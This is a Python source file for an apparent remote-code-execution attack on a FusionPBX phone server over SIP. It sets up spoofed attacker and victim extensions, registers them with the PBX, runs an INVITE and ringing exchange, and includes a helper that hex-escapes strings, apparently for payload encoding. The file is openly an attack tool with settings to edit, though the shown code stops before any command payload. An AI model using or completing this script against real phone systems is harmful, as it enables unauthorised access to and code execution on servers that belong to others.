import socket
from sip_client import SipClient


def encode(val) -> str:
    ret = ""
    for c in val:
        ret += "\\x%02x" % ord(c)
    return ret


class RceAttack:
    def __init__(
            self,
            attacker_number,
            attacker_port: int,
            victim_number: str,
            victim_port: int,
            attacker_address: str,  # "192.168.20.53"
            fusion_pbx_address: str  # "192.168.21.58"
    ):
        # edit these variables to set up attack
        self._victim_number = victim_number  # "1002"
        self._victim_port = victim_port  # 53086
        self._attacker_number = attacker_number
        self._attacker_port = attacker_port  # 52058
        self.attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.victim_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.attacker_socket.bind((attacker_address, self._attacker_port))
        self.victim_socket.bind((attacker_address, self._victim_port))
        self.attacker_socket.connect((fusion_pbx_address, 5060))
        self.victim_socket.connect((fusion_pbx_address, 5060))
        self.attacker_client = SipClient(
            fusion_pbx_address,
            attacker_address,
            self._attacker_number,
            self._attacker_port)
        self.victim_client = SipClient(
            fusion_pbx_address,
            attacker_address,
            self._victim_number,
            victim_port)

    def register_victim(self):
        self.victim_socket.send(bytes(self.victim_client.register(300).encode('utf-8')))
        self.victim_socket.recv(8192)

    def register_attacker(self):
        self.attacker_socket.send(bytes(self.attacker_client.register(300).encode('utf-8')))
        self.attacker_socket.recv(8192)

    def initiate_call(self):
        # attacker send invite
        self.attacker_socket.send(bytes(self.attacker_client.invite_message(self._victim_number).encode('utf-8')))
        # attacker recive 100 trying
        self.attacker_socket.recv(8192)
        # vitcim recive invite trying
        invite = self.victim_socket.recv(8192)
        # vitcim send 100 trying
        self.victim_socket.send(bytes(self.victim_client.trying_100(invite.decode('utf-8')).encode('utf-8')))
        # vitcim send 180 ringing
        self.victim_socket.send(bytes(self.victim_client.ringing_180(invite.decode('utf-8')).encode('utf-8')))
        # attacker recive 180 ringing
        self.attacker_socket.recv(8192)

    def close_sockets(self):
        self.victim_socket.send(bytes(self.victim_client.register(0).encode('utf-8')))
        self.victim_socket.recv(8192)
        self.attacker_socket.close()
        self.victim_socket.close()
